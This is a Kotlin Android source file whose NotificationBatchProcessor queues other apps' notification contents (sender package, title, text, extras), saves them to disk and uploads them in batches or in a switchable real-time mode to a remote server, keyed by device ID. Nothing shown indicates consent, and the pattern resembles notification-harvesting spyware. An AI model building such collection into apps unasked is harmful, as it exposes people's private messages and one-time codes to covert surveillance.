package com.example.fast.util

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import com.prexoft.prexocore.readInternalFile
import com.prexoft.prexocore.writeInternalFile
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * NotificationBatchProcessor
 * 
 * Optimizes notification processing by batching notifications together before uploading to Firebase.
 * This prevents Firebase overload when receiving many notifications.
 * 
 * Features:
 * - Batches notifications: Uploads every 5 minutes OR when 100 notifications collected (default mode)
 * - Real-time mode: Uploads each notification immediately (temporary mode)
 * - Processes in background thread
 * - Prevents Firebase overload (no one-by-one uploads in batch mode)
 * - Deduplication: Prevents uploading same notification twice (in-memory cache)
 * - JSON format for batch upload
 * - Persistent storage: Queued notifications saved to JSON file (survives app restarts)
 * - Priority processing: Newest notifications processed first (timestamp descending)
 * - Batch processing: Processes 100 notifications at a time, one batch at a time
 * 
 * Sync Modes:
 * - BATCH (default): Collects notifications in queue, uploads when: 100 collected OR 5 minutes elapsed
 * - REALTIME: Uploads each notification immediately to Firebase
 * 
 * Batch Strategy:
 * - Collects notifications in queue
 * - Uploads when: 100 notifications collected OR 5 minutes elapsed (whichever comes first)
 * - All notifications uploaded in single JSON batch
 * - Notifications persisted to JSON file for offline recovery
 */
object NotificationBatchProcessor {
    
    private const val TAG = "NotificationBatchProcessor"
    private const val BATCH_SIZE = 100 // Upload when 100 notifications collected
    private const val BATCH_TIMEOUT_MS = 5 * 60 * 1000L // 5 minutes max wait
    private const val MAX_CACHE_SIZE = 1000 // Keep last 1000 notification hashes in memory
    private const val STORAGE_FILE_NAME = "queued_notifications.json" // JSON file for persistent storage
    
    enum class SyncMode {
        BATCH,      // Default: Batch upload mode
        REALTIME    // Real-time: Upload immediately
    }
    
    private var syncMode: SyncMode = SyncMode.BATCH // Default to batch mode
    private var realtimeEndTime: Long? = null // When to auto-switch back to batch mode
    private var realtimeTimer: Runnable? = null // Timer for auto-switch
    
    private val notificationQueue = ConcurrentLinkedQueue<QueuedNotification>()
    private val handler = Handler(Looper.getMainLooper())
    private var batchTimer: Runnable? = null
    private val processingLock = Any()
    private var isProcessing = false
    private var isInitialized = false // Track if initialized from storage
    
    // Gson instance for JSON parsing
    private val gson: Gson = GsonBuilder()
        .setPrettyPrinting()
        .create()
    
    // Deduplication: Track recently uploaded notifications by hash
    // Key: notification hash (title + text + package + timestamp), Value: upload timestamp
    private val uploadedNotificationsCache = ConcurrentHashMap<String, Long>()
    
    data class QueuedNotification(
        val packageName: String,
        val title: String,
        val text: String,
        val timestamp: Long,
        val notificationHash: String, // Hash for deduplication
        val extra: Map<String, Any?> = emptyMap()
    )
    
    /**
     * Data class for JSON file structure
     */
    private data class NotificationStorage(
        val notifications: List<QueuedNotification>,
        val lastUpdated: Long
    )
    
    /**
     * Create unique notification hash for deduplication
     * Format: MD5(package + title + text + timestamp rounded to seconds)
     */
    private fun createNotificationHash(packageName: String, title: String, text: String, timestamp: Long): String {
        // Round timestamp to seconds for better duplicate detection
        val timestampSeconds = (timestamp / 1000) * 1000
        val input = "${packageName}|${title}|${text}|${timestampSeconds}"
        
        try {
            val md = MessageDigest.getInstance("MD5")
            val hashBytes = md.digest(input.toByteArray())
            return hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            // Fallback to simple hash if MD5 fails
            return "${packageName}_${title.hashCode()}_${text.hashCode()}_$timestampSeconds"
        }
    }
    
    /**
     * Load queued notifications from JSON file
     * Called on app startup to recover notifications from previous session
     */
    fun initializeFromStorage(context: Context) {
        synchronized(processingLock) {
            if (isInitialized) {
                Log.d(TAG, "Already initialized from storage, skipping")
                return
            }
            
            try {
                val jsonString = context.readInternalFile(STORAGE_FILE_NAME)
                if (jsonString.isBlank()) {
                    Log.d(TAG, "No stored notifications found, starting fresh")
                    isInitialized = true
                    return
                }
                
                val storage: NotificationStorage = gson.fromJson(jsonString, NotificationStorage::class.java)
                
                // Sort notifications by timestamp descending (newest first) for priority processing
                val sortedNotifications = storage.notifications.sortedByDescending { it.timestamp }
                
                // Add all stored notifications to queue (newest first)
                sortedNotifications.forEach { notification ->
                    notificationQueue.offer(notification)
                    // Add to cache to prevent re-queuing
                    uploadedNotificationsCache[notification.notificationHash] = 0L
                }
                
                isInitialized = true
                Log.d(TAG, "✅ Loaded ${sortedNotifications.size} notifications from storage (sorted: newest first, last updated: ${java.util.Date(storage.lastUpdated)})")
                
                // Schedule batch processing if queue is not empty
                if (notificationQueue.isNotEmpty() && !isProcessing && batchTimer == null) {
                    scheduleBatchProcessing(context)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error loading notifications from storage, starting fresh", e)
                isInitialized = true
            }
        }
    }
    
    /**
     * Save queued notifications to JSON file
     * Persists notifications to disk for offline recovery
     * Stores in sorted order (newest first) for priority processing
     */
    private fun saveToStorage(context: Context) {
        Thread {
            try {
                val notificationsList = mutableListOf<QueuedNotification>()
                
                // Copy all notifications from queue
                notificationQueue.forEach { notification ->
                    notificationsList.add(notification)
                }
                
                // Sort by timestamp descending (newest first) for priority processing on next load
                notificationsList.sortByDescending { it.timestamp }
                
                val storage = NotificationStorage(
                    notifications = notificationsList,
                    lastUpdated = System.currentTimeMillis()
                )
                
                val jsonString = gson.toJson(storage)
                context.writeInternalFile(STORAGE_FILE_NAME, jsonString)
                
                Log.d(TAG, "💾 Saved ${notificationsList.size} notifications to storage (sorted: newest first)")
            } catch (e: Exception) {
                Log.e(TAG, "Error saving notifications to storage", e)
            }
        }.start()
    }
    
    /**
     * Clear storage file
     * Called after successful upload of all notifications
     */
    private fun clearStorage(context: Context) {
        Thread {
            try {
                context.writeInternalFile(STORAGE_FILE_NAME, "")
                Log.d(TAG, "🗑️ Cleared storage file")
            } catch (e: Exception) {
                Log.e(TAG, "Error clearing storage file", e)
            }
        }.start()
    }
    
    /**
     * Add notification to batch queue with in-memory deduplication check
     * 
     * @param context Application context
     * @param packageName Package name of the app that sent notification
     * @param title Notification title
     * @param text Notification text
     * @param timestamp Notification timestamp
     */
    fun queueNotification(
        context: Context,
        packageName: String,
        title: String,
        text: String,
        timestamp: Long,
        extra: Map<String, Any?> = emptyMap()
    ) {
        // Create notification hash for deduplication
        val notificationHash = createNotificationHash(packageName, title, text, timestamp)
        
        // Check in-memory cache for duplicates (fast check within same app instance)
        if (uploadedNotificationsCache.containsKey(notificationHash)) {
            Log.d(TAG, "Duplicate notification detected in cache (hash: ${notificationHash.take(8)}...), skipping")
            return
        }
        
        // Check sync mode
        synchronized(processingLock) {
            if (syncMode == SyncMode.REALTIME) {
                // Real-time mode: Upload immediately
                uploadNotificationImmediately(context, packageName, title, text, timestamp, notificationHash, extra)
                return
            }
        }
        
        // Batch mode: Add to queue
        val notification = QueuedNotification(
            packageName = packageName,
            title = title,
            text = text,
            timestamp = timestamp,
            notificationHash = notificationHash,
            extra = extra
        )
        
        // Add to queue
        notificationQueue.offer(notification)
        Log.d(TAG, "Notification queued: $packageName - ${title.take(30)}... (queue size: ${notificationQueue.size})")
        
        // Save to persistent storage
        saveToStorage(context)
        
        // Check if we're currently processing a batch
        synchronized(processingLock) {
            if (isProcessing) {
                // If upload is in progress, new notifications will be prioritized in next batch
                // (they'll be sorted by timestamp descending when processing next batch)
                Log.d(TAG, "Upload in progress - new notification will be prioritized in next batch (newest first)")
                return
            }
            
            // Schedule batch processing if not already scheduled
            if (batchTimer == null) {
                scheduleBatchProcessing(context)
            }
            
            // Check if batch size reached (100 notifications)
            if (notificationQueue.size >= BATCH_SIZE) {
                Log.d(TAG, "Batch size reached ($BATCH_SIZE), triggering immediate batch upload (newest first)")
                processBatch(context)
            }
        }
    }
    
    /**
     * Upload notification immediately to Django (real-time mode)
     */
    private fun uploadNotificationImmediately(
        context: Context,
        packageName: String,
        title: String,
        text: String,
        timestamp: Long,
        notificationHash: String,
        extra: Map<String, Any?> = emptyMap()
    ) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                
                val notificationData = mapOf(
                    "package_name" to packageName,
                    "title" to title,
                    "text" to text,
                    "timestamp" to timestamp,
                    "extra" to extra
                )
                
                DjangoApiHelper.syncNotifications(deviceId, listOf(notificationData))
                Log.d(TAG, "✅ Real-time: Uploaded notification immediately to Django: $packageName - ${title.take(30)}...")
                
                // Mark in cache
                uploadedNotificationsCache[notificationHash] = System.currentTimeMillis()
                cleanupCache()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Real-time: Failed to upload notification immediately to Django", e)
                // On failure, add to queue for batch retry
                val notification = QueuedNotification(
                    packageName = packageName,
                    title = title,
                    text = text,
                    timestamp = timestamp,
                    notificationHash = notificationHash,
                    extra = extra
                )
                notificationQueue.offer(notification)
                // Save to persistent storage
                saveToStorage(context)
            }
        }
    }
    
    /**
     * Switch to real-time sync mode for specified duration
     * After duration expires, automatically switches back to batch mode
     * 
     * @param context Application context
     * @param minutes Duration in minutes to stay in real-time mode
     */
    fun switchToRealtimeMode(context: Context, minutes: Int) {
        synchronized(processingLock) {
            syncMode = SyncMode.REALTIME
            val durationMs = minutes * 60 * 1000L
            realtimeEndTime = System.currentTimeMillis() + durationMs
            
            Log.d(TAG, "Switched to REAL-TIME mode for $minutes minutes")
            
            // Cancel existing timer if any
            realtimeTimer?.let {
                handler.removeCallbacks(it)
            }
            
            // Schedule auto-switch back to batch mode
            realtimeTimer = Runnable {
                synchronized(processingLock) {
                    if (syncMode == SyncMode.REALTIME) {
                        Log.d(TAG, "Real-time mode duration expired, switching back to BATCH mode")
                        switchToBatchMode(context)
                    }
                }
            }
            
            handler.postDelayed(realtimeTimer!!, durationMs)
            
            // Process any queued notifications immediately
            if (notificationQueue.isNotEmpty()) {
                Log.d(TAG, "Processing ${notificationQueue.size} queued notifications in real-time mode")
                processQueuedNotificationsInRealtime(context)
            }
        }
    }
    
    /**
     * Switch back to batch mode (default)
     */
    fun switchToBatchMode(context: Context) {
        synchronized(processingLock) {
            syncMode = SyncMode.BATCH
            realtimeEndTime = null
            
            // Cancel real-time timer
            realtimeTimer?.let {
                handler.removeCallbacks(it)
                realtimeTimer = null
            }
            
            Log.d(TAG, "Switched to BATCH mode (default)")
            
            // Schedule batch processing for any queued notifications
            if (notificationQueue.isNotEmpty() && !isProcessing && batchTimer == null) {
                scheduleBatchProcessing(context)
            }
        }
    }
    
    /**
     * Process all queued notifications in real-time mode
     * Processes newest notifications first for priority
     */
    private fun processQueuedNotificationsInRealtime(context: Context) {
        Thread {
            val notificationsToProcess = mutableListOf<QueuedNotification>()
            while (notificationQueue.isNotEmpty()) {
                val notification = notificationQueue.poll()
                if (notification != null) {
                    notificationsToProcess.add(notification)
                }
            }
            
            // Sort by timestamp descending (newest first) for priority processing
            notificationsToProcess.sortByDescending { it.timestamp }
            
            Log.d(TAG, "🔄 Processing ${notificationsToProcess.size} notifications in real-time mode (newest first priority)")
            
            notificationsToProcess.forEach { notification ->
                uploadNotificationImmediately(
                    context,
                    notification.packageName,
                    notification.title,
                    notification.text,
                    notification.timestamp,
                    notification.notificationHash
                )
            }
        }.start()
    }
    
    /**
     * Get current sync mode
     */
    fun getSyncMode(): SyncMode {
        return syncMode
    }
    
    /**
     * Check if real-time mode is active and should auto-switch
     */
    fun checkAndAutoSwitch(context: Context) {
        synchronized(processingLock) {
            if (syncMode == SyncMode.REALTIME && realtimeEndTime != null) {
                if (System.currentTimeMillis() >= realtimeEndTime!!) {
                    switchToBatchMode(context)
                }
            }
        }
    }
    
    /**
     * Schedule batch processing with timeout (5 minutes)
     */
    private fun scheduleBatchProcessing(context: Context) {
        batchTimer = Runnable {
            synchronized(processingLock) {
                if (!isProcessing && notificationQueue.isNotEmpty()) {
                    Log.d(TAG, "Batch timeout reached (${BATCH_TIMEOUT_MS / 1000}s), processing batch")
                    processBatch(context)
                }
                batchTimer = null
            }
        }
        
        handler.postDelayed(batchTimer!!, BATCH_TIMEOUT_MS)
        Log.d(TAG, "Scheduled batch processing in ${BATCH_TIMEOUT_MS / 1000} seconds")
    }
    
    /**
     * Process batch of notifications and upload to Firebase
     */
    private fun processBatch(context: Context) {
        synchronized(processingLock) {
            if (isProcessing) {
                Log.d(TAG, "Batch processing already in progress, skipping")
                return
            }
            
            if (notificationQueue.isEmpty()) {
                Log.d(TAG, "Notification queue is empty, nothing to process")
                return
            }
            
            isProcessing = true
        }
        
        // Cancel batch timer
        batchTimer?.let {
            handler.removeCallbacks(it)
            batchTimer = null
        }
        
        // Process in background thread
        Thread {
            try {
                // Collect all notifications from queue first
                val allNotifications = mutableListOf<QueuedNotification>()
                while (notificationQueue.isNotEmpty()) {
                    val notification = notificationQueue.poll()
                    if (notification != null) {
                        allNotifications.add(notification)
                    }
                }
                
                if (allNotifications.isEmpty()) {
                    Log.d(TAG, "No notifications to process")
                    synchronized(processingLock) {
                        isProcessing = false
                    }
                    return@Thread
                }
                
                // Sort by timestamp descending (newest first) for priority processing
                allNotifications.sortByDescending { it.timestamp }
                
                // Take the first 100 notifications (newest ones)
                val notificationsToProcess = allNotifications.take(BATCH_SIZE)
                
                // Put remaining notifications back in queue (will be processed in next batch)
                allNotifications.drop(BATCH_SIZE).forEach { notification ->
                    notificationQueue.offer(notification)
                }
                
                Log.d(TAG, "🔄 Processing batch of ${notificationsToProcess.size} notifications (newest first priority)")
                if (allNotifications.size > BATCH_SIZE) {
                    Log.d(TAG, "📦 ${allNotifications.size - BATCH_SIZE} notifications remaining for next batch")
                }
                
                // Get device ID
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                val notificationsBasePath = AppConfig.getFirebaseNotificationPath(deviceId)
                
                // Create list for Django (include extra fields)
                val notificationsList = notificationsToProcess.mapNotNull { notification ->
                    if (uploadedNotificationsCache.containsKey(notification.notificationHash)) {
                        Log.d(TAG, "Duplicate notification detected in cache (hash: ${notification.notificationHash.take(8)}...), skipping")
                        return@mapNotNull null
                    }
                    mapOf(
                        "package_name" to notification.packageName,
                        "title" to notification.title,
                        "text" to notification.text,
                        "timestamp" to notification.timestamp,
                        "extra" to notification.extra
                    )
                }
                
                // Upload batch to Django
                if (notificationsList.isNotEmpty()) {
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            DjangoApiHelper.syncNotifications(deviceId, notificationsList)
                            Log.d(TAG, "✅ Successfully uploaded batch of ${notificationsList.size} notifications to Django")
                            
                            // Mark all uploaded notifications in cache to prevent duplicates within same instance
                            notificationsToProcess.forEach { notification ->
                                uploadedNotificationsCache[notification.notificationHash] = System.currentTimeMillis()
                            }
                            
                            // Cleanup old cache entries
                            cleanupCache()
                            
                            // Update persistent storage (remove uploaded notifications)
                            if (notificationQueue.isEmpty()) {
                                clearStorage(context)
                            } else {
                                saveToStorage(context)
                            }
                            
                            // Schedule next batch if queue is not empty
                            synchronized(processingLock) {
                                isProcessing = false
                                if (notificationQueue.isNotEmpty()) {
                                    scheduleBatchProcessing(context)
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to upload notification batch to Django, re-queuing", e)
                            
                            // Re-queue notifications on failure
                            notificationsToProcess.forEach { notification ->
                                notificationQueue.offer(notification)
                            }
                            
                            // Update persistent storage (re-queue failed notifications)
                            saveToStorage(context)
                            
                            // Retry after delay
                            synchronized(processingLock) {
                                isProcessing = false
                                scheduleBatchProcessing(context)
                            }
                        }
                    }
                } else {
                    Log.d(TAG, "No notifications to upload after deduplication")
                    synchronized(processingLock) {
                        isProcessing = false
                        if (notificationQueue.isNotEmpty()) {
                            scheduleBatchProcessing(context)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing notification batch", e)
                synchronized(processingLock) {
                    isProcessing = false
                    if (notificationQueue.isNotEmpty()) {
                        scheduleBatchProcessing(context)
                    }
                }
            }
        }.start()
    }
    
    /**
     * Cleanup old cache entries to prevent memory leak
     */
    private fun cleanupCache() {
        if (uploadedNotificationsCache.size > MAX_CACHE_SIZE) {
            val currentTime = System.currentTimeMillis()
            val entriesToRemove = uploadedNotificationsCache.entries
                .filter { (currentTime - it.value) > (10 * 60 * 1000L) } // Remove entries older than 10 minutes
                .map { it.key }
            
            entriesToRemove.forEach { hash ->
                uploadedNotificationsCache.remove(hash)
            }
            
            if (entriesToRemove.isNotEmpty()) {
                Log.d(TAG, "Cleaned up ${entriesToRemove.size} old cache entries")
            }
        }
    }
    
    /**
     * Force process any pending notifications immediately
     * Useful for testing or when app is closing
     */
    fun flush(context: Context) {
        synchronized(processingLock) {
            if (notificationQueue.isNotEmpty() && !isProcessing) {
                Log.d(TAG, "Flushing ${notificationQueue.size} pending notifications")
                processBatch(context)
            }
        }
    }
}
